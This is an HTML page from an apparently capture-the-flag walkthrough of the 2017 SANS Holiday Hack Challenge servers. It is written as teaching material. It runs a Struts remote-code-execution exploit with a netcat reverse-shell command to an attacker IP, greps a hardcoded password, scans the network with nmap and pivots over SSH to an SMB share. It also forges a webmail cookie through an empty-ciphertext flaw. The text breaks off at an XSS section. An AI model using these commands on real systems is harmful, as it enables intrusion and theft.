@@ -1,0 +1,1014 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="author" content="Dan Roberts">
+  <link rel="shortcut icon" href="img/favicon.ico">
+  <title>Servers - Holiday Hack Challenge 2017 Solution</title>
+  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>
+
+  <link rel="stylesheet" href="css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="css/theme_extra.css" type="text/css" />
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "Servers";
+    var mkdocs_page_input_path = "servers.md";
+    var mkdocs_page_url = null;
+  </script>
+  
+  <script src="js/jquery-2.1.1.min.js" defer></script>
+  <script src="js/modernizr-2.8.3.min.js" defer></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script> 
+  
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+      <div class="wy-side-nav-search">
+        <a href="index.html" class="icon icon-home"> Holiday Hack Challenge 2017 Solution</a>
+        
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+	<ul class="current">
+	  
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="index.html">Introduction</a>
+	    </li>
+          
+            <li class="toctree-l1 current">
+		
+    <a class="current" href="servers.html">Servers</a>
+    <ul class="subnav">
+            
+    <li class="toctree-l2"><a href="#letters-to-santa">Letters to Santa</a></li>
+    
+
+    <li class="toctree-l2"><a href="#recon-and-gain-more-access">Recon and gain more access</a></li>
+    
+
+    <li class="toctree-l2"><a href="#windows-smb-server">Windows SMB Server</a></li>
+    
+
+    <li class="toctree-l2"><a href="#elf-web-access-ewa">Elf Web Access (EWA)</a></li>
+    
+
+    <li class="toctree-l2"><a href="#north-pole-elf-database-edb">North Pole Elf Database (EDB)</a></li>
+    
+
+    <li class="toctree-l2"><a href="#north-pole-police-department">North Pole Police Department</a></li>
+    
+
+    <li class="toctree-l2"><a href="#elf-as-a-service-eaas">Elf as a Service (EaaS)</a></li>
+    
+
+    <li class="toctree-l2"><a href="#elf-machine-interfaces-emi">Elf-Machine Interfaces (EMI)</a></li>
+    
+
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="terminals.html">Terminals</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="snowballs.html">Snowball Challenges</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="eggs.html">Easter Eggs</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="appendix.html">Appendix</a>
+	    </li>
+          
+        </ul>
+      </div>
+      &nbsp;
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="index.html">Holiday Hack Challenge 2017 Solution</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="index.html">Docs</a> &raquo;</li>
+    
+      
+    
+    <li>Servers</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="letters-to-santa">Letters to Santa</h1>
+<p>Start at the Letters to Santa server (https://l2s.northpolechristmastown.com/). This server is publicly available from the Internet. The page source contains a link to a development version of the server.</p>
+<pre><code class="html">    &lt;!-- Development version --&gt;
+    &lt;a href=&quot;http://dev.northpolechristmastown.com&quot; style=&quot;display: none;&quot;&gt;Access Development Version&lt;/a&gt;
+</code></pre>
+
+<p>The development server contains a Toy Request Form.  Observe the page footer states that the application is powered by Apache Struts, and the structure of the site suggests a RESTful API.  There were several high profile Apache Struts vulnerabilities revealed in 2017; <a href="https://www.cvedetails.com/cve/CVE-2017-9805/">CVE-2017-9805</a> discusses a remote code execution vulnerability related to the REST plugin in Struts.</p>
+<p>Find the SANS Penetration Test blog article titled <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">Why You Need the Skills to Tinker with Publicly Released Exploit Code</a> that's mentioned in the hints from Sparkle Redberry.  Download the exploit code and try running it against the dev server.  The exploit code takes two arguments: </p>
+<ul>
+<li>A vulnerable URL: https://dev.northpolechristmastown.com/orders</li>
+<li>A shell command to run on the victim server, "nc -e /bin/sh <ip address> <port>", which executes netcat and creates a reverse shell connection to a given destination IP address and port. </li>
+</ul>
+<pre><code class="bash">root@kali:~/hh17/l2s# ./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders -c &quot;nc -e /bin/sh 192.0.2.123 8001&quot;
+[+] Encoding Command
+[+] Building XML object
+[+] Placing command in XML object
+[+] Converting Back to String
+[+] Making Post Request with our payload
+[+] Payload executed
+</code></pre>
+
+<p>Meanwhile, start a netcat listener on the attacker PC to accept the reverse shell connection.  When it connects, explore the system to find the Great Book page and the hardcoded password in the web application code.  The Struts application code will be found within the Tomcat server's directory structure (/opt/apache-tomcat).  Use grep with the -R (recursive) option to search for a file that contains the string "alabaster", then grep for a password in the same file.</p>
+<pre><code class="bash">root@kali:~# nc -vnlp 8001
+listening on [any] 8001 ...
+connect to [192.0.2.123] from (UNKNOWN) [35.190.140.65] 60766
+id
+uid=1003(alabaster_snowball) gid=1004(alabaster_snowball) groups=1004(alabaster_snowball)
+
+ls -la /var/www/html
+total 1772
+drwxrwxrwt 6 www-data           www-data              4096 Dec 27 05:30 .
+drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
+drwxr-xr-x 2 root               www-data              4096 Oct 12 19:03 css
+drwxr-xr-x 3 root               www-data              4096 Oct 12 19:40 fonts
+-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
+drwxr-xr-x 2 root               www-data              4096 Oct 12 19:14 imgs
+-rw-r--r-- 1 root               www-data             14501 Nov 24 20:53 index.html
+drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
+-rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
+
+grep -R alabaster /opt
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = &quot;alabaster_snowball&quot;;
+
+grep password /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
+            final String password = &quot;stream_unhappy_buy_loss&quot;;   
+            String connectionURL = &quot;jdbc:mysql://&quot; + host + &quot;:3306/db?user=;password=&quot;;
+           connection = (Connection) DriverManager.getConnection(connectionURL,      username, password);
+</code></pre>
+
+<p>Observe the hardcoded credentials in /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class are username: <strong><em>alabaster_snowball</em></strong>, password: <strong><em>stream_unhappy_buy_loss</em></strong>.</p>
+<p>Now, download the great book page using wget.</p>
+<pre><code class="bash">root@kali:~/hh17/l2s# wget https://l2s.northpolechristmastown.com/GreatBookPage2.pdf
+--2017-12-27 16:49:21--  https://l2s.northpolechristmastown.com/GreatBookPage2.pdf
+Resolving l2s.northpolechristmastown.com (l2s.northpolechristmastown.com)... 35.185.84.51
+Connecting to l2s.northpolechristmastown.com (l2s.northpolechristmastown.com)|35.185.84.51|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1764298 (1.7M) [application/pdf]
+Saving to: ‘GreatBookPage2.pdf’
+
+GreatBookPage2.pdf          100%[===========================================&gt;]   1.68M  3.56MB/s    in 0.5s 
+
+2017-12-27 16:49:22 (3.56 MB/s) - ‘GreatBookPage2.pdf’ saved [1764298/1764298]
+</code></pre>
+
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p><a href="http://nc110.sourceforge.net/">Read more about netcat</a>, plus download <a href="https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf">a handy cheatsheet from SANS</a>.</p>
+</div>
+<h1 id="recon-and-gain-more-access">Recon and gain more access</h1>
+<p>While still connected to the dev server reverse shell, perform recon tasks to collect details about the environment that might be useful later.</p>
+<p><strong>View /etc/hosts to find a list of other hosts in the environment.</strong></p>
+<pre><code class="bash">cat /etc/hosts
+
+127.0.0.1   localhost l2s dev.northpolechristmastown.com l2s.northpolechristmastown.com
+10.142.0.5  mail.northpolechristmastown.com ewa.northpolechristmastown.com
+10.142.0.13 eaas.northpolechristmastown.com
+10.142.0.6  edb.northpolechristmastown.com
+::1     localhost l2s ip6-localhost ip6-loopback
+ff02::1     ip6-allnodes
+ff02::2     ip6-allrouters
+
+10.142.0.3 hhc17-apache-struts1.c.holidayhack2017.internal hhc17-apache-struts1  # Added by Google
+169.254.169.254 metadata.google.internal  # Added by Google
+</code></pre>
+
+<p><strong>Use nmap to gather additional details about each host.</strong></p>
+<pre><code class="plain">nmap -A 10.142.0.0/24
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-27 05:56 UTC
+Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
+Host is up (0.00016s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp   open  http     nginx 1.10.3
+|_http-server-header: nginx/1.10.3
+|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
+443/tcp  open  ssl/http nginx 1.10.3
+|_http-server-header: nginx/1.10.3
+|_http-title: Toys List
+| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
+| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
+| Not valid before: 2017-11-29T12:54:54
+|_Not valid after:  2018-02-27T12:54:54
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg: 
+|_  http/1.1
+2222/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
+Host is up (0.00018s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp open  http    nginx 1.10.3
+|_http-server-header: nginx/1.10.3
+|_http-title: Toys List
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
+Host is up (0.00016s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 62:c5:eb:70:08:4e:44:ef:9c:9c:54:f3:81:8a:00:9f (RSA)
+|_  256 8b:f1:15:a0:68:46:c1:80:82:da:19:cb:68:25:9e:43 (ECDSA)
+25/tcp   open  smtp       Postfix smtpd
+|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+80/tcp   open  http       nginx 1.10.3 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/cookie.txt
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+143/tcp  open  imap       Dovecot imapd
+|_imap-capabilities: IMAP4rev1 more LITERAL+ ID LOGIN-REFERRALS post-login ENABLE capabilities listed SASL-IR IDLE OK Pre-login have AUTH=LOGINA0001 AUTH=PLAIN
+2525/tcp open  smtp       Postfix smtpd
+|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+3000/tcp open  tcpwrapped
+Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
+Host is up (0.00017s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 69:37:65:10:2d:f3:d8:88:77:48:54:e3:a5:de:11:5a (RSA)
+|_  256 dc:27:b3:55:ef:7e:5c:21:7b:ca:f5:eb:08:97:d8:01 (ECDSA)
+80/tcp   open  http       nginx 1.10.3
+| http-robots.txt: 1 disallowed entry 
+|_/dev
+|_http-server-header: nginx/1.10.3
+| http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_Requested resource was http://edb.northpolechristmastown.com/index.html
+389/tcp  open  tcpwrapped
+8080/tcp open  tcpwrapped
+| http-robots.txt: 1 disallowed entry 
+|_/dev
+|_http-server-header: Werkzeug/0.12.2 Python/2.7.13
+|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+Host is up (0.00031s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hhc17-smb-server
+| Not valid before: 2017-11-06T13:46:55
+|_Not valid after:  2018-05-08T13:46:55
+|_ssl-date: 2017-12-27T05:57:49+00:00; 0s from scanner time.
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
+Host is up (0.00016s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp open  http    nginx 1.10.3
+|_http-server-header: nginx/1.10.3
+|_http-title: Toys List
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
+Host is up (0.00068s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Index - North Pole Engineering Presents: EaaS!
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
+| Not valid before: 2017-11-23T20:53:55
+|_Not valid after:  2018-05-25T20:53:55
+|_ssl-date: 2017-12-27T05:57:49+00:00; -1s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+
+Post-scan script results:
+| ssh-hostkey: Possible duplicate hosts
+| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
+|   10.142.0.2
+|   10.142.0.3
+|   10.142.0.11
+| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
+|   10.142.0.2
+|   10.142.0.3
+|_  10.142.0.11
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 256 IP addresses (7 hosts up) scanned in 104.82 seconds
+</code></pre>
+
+<p><strong>Use SSH to connect to the l2s server</strong></p>
+<p>SSH into the l2s server using the username and password gathered from the development web server.</p>
+<pre><code class="plain">root@kali:~/hh17/l2s# ssh alabaster_snowball@l2s.northpolechristmastown.com
+alabaster_snowball@l2s.northpolechristmastown.com's password:
+alabaster_snowball@l2s:/tmp/asnow.Xjxkdg5iGS1lJuOvn497v1kj$ 
+</code></pre>
+
+<h1 id="windows-smb-server">Windows SMB Server</h1>
+<p>Observe that the nmap scan output does not include an SMB server, aside from the EMI server that will be discussed later.  Using SSH access to the L2S server, run nmap find to hosts on 10.142.0.0/24 that don't respond to ICMP echo-request (PING), but are listening on port tcp/445 (SMB).  </p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The -Pn option skips host discovery, and assuming all hosts are up, nmap scans the specified ports on all IP addresses in the list you provide.</p>
+</div>
+<pre><code class="plain">alabaster_snowball@l2s:/tmp/asnow.Xjxkdg5iGS1lJuOvn497v1kj$ nmap -Pn -p445 --open 10.142.0.0/24
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-27 05:47 UTC
+Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+Host is up (0.0013s latency).
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+Host is up (0.00034s latency).
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap done: 256 IP addresses (256 hosts up) scanned in 5.85 seconds
+</code></pre>
+
+<p>Notice a previously undiscovered host appears in the results.  Perform a more exhausive scan on the SMB server at 10.142.0.7 to gather additional details about it.</p>
+<pre><code class="plain">alabaster_snowball@l2s:/tmp/asnow.Xjxkdg5iGS1lJuOvn497v1kj$ nmap -A -Pn 10.142.0.7
+Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+Host is up (0.00068s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE            VERSION
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hhc17-emi
+| Not valid before: 2017-11-06T13:51:23
+|_Not valid after:  2018-05-08T13:51:23
+|_ssl-date: 2017-12-27T06:23:08+00:00; 0s from scanner time.
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 122.43 seconds
+alabaster_snowball@l2s:/tmp/asnow.Xjxkdg5iGS1lJuOvn497v1kj$ 
+</code></pre>
+
+<p>Add port forwarding to the SSH session to use local tools on the attack PC to interact with the SMB server. </p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Most documentation shows how to set up port forwarding from the command line using the -L option, however it's possible to add port forwarding to an existing connection.  See <a href="https://nixshell.wordpress.com/2008/12/10/ssh-port-forwarding-without-starting-a-new-session/">SSH Port Forwarding Without Starting A new Session</a>.</p>
+</div>
+<pre><code class="plain">alabaster_snowball@l2s:/tmp/asnow.Xjxkdg5iGS1lJuOvn497v1kj$ 
+ssh&gt; -L445:10.142.0.7:445
+Forwarding port.
+
+alabaster_snowball@l2s:/tmp/asnow.Xjxkdg5iGS1lJuOvn497v1kj$ 
+</code></pre>
+
+<p>Enumerate the available shares on the SMB server.  Since port forwarding is in use, connections to port 445 on 127.0.0.1 will be forwarded to port 445 on the SMB server 10.142.0.7.  Use smbclient to browse fileshares and download any discovered files, including page 3 of The Great Book.</p>
+<pre><code class="plain">root@kali:~# smbclient -L 127.0.0.1 -U alabaster_snowball
+Enter alabaster_snowball's password: 
+Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    C$              Disk      Default share
+    FileStor        Disk      
+    IPC$            IPC       Remote IPC
+Connection to 127.0.0.1 failed (Error NT_STATUS_CONNECTION_REFUSED)
+NetBIOS over TCP disabled -- no workgroup available
+
+root@kali:~# smbclient '\\127.0.0.1\Filestor\' -U alabaster_snowball
+Enter alabaster_snowball's password: 
+Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
+smb: \&gt; dir
+  .                                   D        0  Wed Dec 27 00:48:17 2017
+  ..                                  D        0  Wed Dec 27 00:48:17 2017
+  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017
+  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017
+  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017
+  Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017
+  Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017
+
+        13106687 blocks of size 4096. 9626547 blocks available
+
+smb: \&gt; get GreatBookPage3.pdf
+getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (1965.1 KiloBytes/sec) (average 1965.1 KiloBytes/sec)
+smb: \&gt; 
+</code></pre>
+
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Alternatively, use the GUI file explorer built into Kali to connect to the file share.</p>
+<p><img alt="Screenshot" src="img/smb-files-1.png" /></p>
+<p><img alt="Screenshot" src="img/smb-files-2.png" /></p>
+</div>
+<h1 id="elf-web-access-ewa">Elf Web Access (EWA)</h1>
+<p>Use SSH port forwarding to access port 80 on 10.142.0.5.  </p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>HTTP/1.1 supports the hosting of multiple web sites on a single IP address.  To distinguish which site to serve up, the server looks for a hostname passed by the web browser in the HTTP Host: header, and then responds with the corresponding site's content.  </p>
+<p>When using SSH port forwarding, it's common to use http://127.0.0.1 to access the remote web server; however in this case the server isn't configured to respond to requests for host "127.0.0.1", so you'll get unexpected results like the default Apache "It Works!" page.  To work around this, add an entry in your /etc/hosts or C:\Windows\system32\drivers\etc\hosts so you can use the hostname when calling the remote web server instead of 127.0.0.1.  </p>
+<p>Example:</p>
+<p><code>127.0.0.1    mail.northpolechristmastown.com</code></p>
+</div>
+<p>Enable your browser's web developer tools (F12 key) to capture the client/server communication, and browse to the EWA logon page at http://mail.northpolechristmastown.com.  Notice that the server sets an interesting cookie named EWA.</p>
+<p>Observe in the nmap scan that this web server has a robots.txt file.  Browse to http://mail.northpolechristmastown.com/robots.txt and observe there's an entry for cookie.txt.  Browse to http://mail.northpolechristmastown.com/cookie.txt, and examine its contents:</p>
+<pre><code class="javascript">//FOUND THESE FOR creating and validating cookies. Going to use this in node js
+    function cookie_maker(username, callback){
+        var key = 'need to put any length key in here';
+        //randomly generates a string of 5 characters
+        var plaintext = rando_string(5)
+        //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
+        //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
+        var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
+        //Setting the values of the cookie.
+        var acookie = ['IOTECHWEBMAIL',JSON.stringify({&quot;name&quot;:username, &quot;plaintext&quot;:plaintext,  &quot;ciphertext&quot;:ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
+        return callback(acookie);
+    };
+    function cookie_checker(req, callback){
+        try{
+            var key = 'need to put any length key in here';
+            //Retrieving the cookie from the request headers and parsing it as JSON
+            var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
+            //Retrieving the cipher text 
+            var ciphertext = thecookie.ciphertext;
+            //Retrievingin the username
+            var username = thecookie.name
+            //retrieving the plaintext
+            var plaintext = aes256.decrypt(key, ciphertext);
+            //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
+            if (plaintext === thecookie.plaintext) {
+                return callback(true, username);
+            } else {
+                return callback(false, '');
+            }
+        } catch (e) {
+            console.log(e);
+            return callback(false, '');
+        }
+    };
+</code></pre>
+
+<p>This javascript code appears to be the basis for how this server creates and validates cookies.  Find the <a href="https://github.com/jaysvoboda/nodejs-aes256/blob/master/nodejs-aes256.js">source code for the nodejs-aes256</a> library used in the sample code.  </p>
+<pre><code class="javascript">aes256.decrypt = function (key, data) {
+    var sha256 = crypto.createHash('sha256');
+    sha256.update(key);
+
+    var input = new Buffer(data, 'base64'),
+        iv = input.slice(0, 16),
+        ciphertext = input.slice(16),
+        decipher = crypto.createDecipheriv(algorithm, sha256.digest(), iv),
+        plaintext = decipher.update(ciphertext);
+    plaintext += decipher.final();
+
+    return plaintext;
+};
+</code></pre>
+
+<p>The code shows that the decryption routine will use an empty value for ciphertext if a 16 byte value is provided for the encrypted string.  This is because the functon uses the first 16 bytes as the initialization vector, leaving nothing left to fill the ciphertext variable.  The result of decrypting an empty ciphertext is an empty plaintext, and since an empty string equals an empty string both in value and type, the function returns a true match and permits authenticated access to the webmail application.</p>
+<p>Modify the cookie to use an empty string for plaintext and a ciphertext value MDAwMDAwMDAwMDAwMDAwMA, along with the e-mail address of whichever user's e-mail box you wish to access.  </p>
+<p><strong>{"name":"santa.claus@northpolechristmastown.com", "plaintext":"", "ciphertext":"MDAwMDAwMDAwMDAwMDAwMA"}</strong></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>MDAwMDAwMDAwMDAwMDAwMA is just the base64 encoded representation of 16 zeros.  The -n parameter to the echo command example below is very important, as without it echo will append a new line character and extend the string to 17 bytes iinstead of 16!</p>
+<p>root@kali:~# echo -n "0000000000000000" | base64</br>
+MDAwMDAwMDAwMDAwMDAwMA==</p>
+</div>
+<p>Use the <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-manager/">Cookie Manager</a> browser plugin to change the cookie's value, then reload the page to bypass the logon screen.</p>
+<p>Read the e-mail from Holly Evergreen to find the URL to page 4 of The Great Book: http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf</p>
+<p><img alt="Screenshot" src="img/mail-holly.png" /></p>
+<p>Expore all of the other e-mails in Santa's inbox to discover additional hints and humor.</p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Alternatively, browse the website through an interception proxy like Burpsuite to modify the cookie.</p>
+<p>Viewing and modifying cookies that have been collected in Burpsuite's cookie jar is fairly straightforward, however setting Burp to use the modified cookie as you browse through the proxy takes an extra step.  In the Session Handling Rule Editor, check the option for Proxy.</p>
+<p><img alt="Screenshot" src="img/ewa-burp-3.png" /></p>
+</div>
+<h1 id="north-pole-elf-database-edb">North Pole Elf Database (EDB)</h1>
+<p>Although there are variations in how to solve each of these challenges, there are two completely different ways to approach this challenge.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The second approach documented here stopped working around the turn of the new year.  I suspect this was an unintended backdoor, but it was fun to exploit while it lasted.</p>
+</div>
+<p><strong>Approach #1: XSS session hijacking</strong></p>
+<p>Use SSH port forwarding to access port 80 on 10.142.0.6, then browse to the web server using url http://edb.northpolechristmastown.com.</p>
+<p>Inspect the page source and observe some javascript toward the bottom that sets a token into a local storage variable.  This must be a session token provided to the user after valid credentials are entered.</p>
+<pre><code class="javascript">    &lt;script&gt;
+        if (!document.cookie) {
+            window.location.href = '/';
